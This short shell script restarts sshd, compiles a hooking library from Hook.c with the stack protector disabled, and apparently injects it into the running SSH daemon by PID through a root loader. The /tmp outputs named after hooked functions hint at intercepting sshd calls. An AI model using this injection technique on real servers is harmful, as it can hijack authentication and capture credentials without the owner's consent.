#!/bin/sh
for i in `ps -A|grep sshd|cut -d ' ' -f2`;do sudo kill -9 $i;done
for i in `ps -A|grep sshd|cut -d ' ' -f1`;do sudo kill -9 $i;done
#sudo $(pwd)/../openssh-portable/sshd -f /etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key
sudo systemctl restart sshd
sudo rm /tmp/ssh
sudo rm /tmp/execv
sudo rm /tmp/hook
sudo rm /tmp/strlens
g++ ./Hook.c -D HOOK -g -O0 -Wl,-z,relro,-z,now -fno-stack-protector -ldl -shared -o debug/hook.so -fPIC
sudo ./debug/main `ps -A |grep sshd|cut -d ' ' -f1` fork fork `pwd`/debug/hook.so
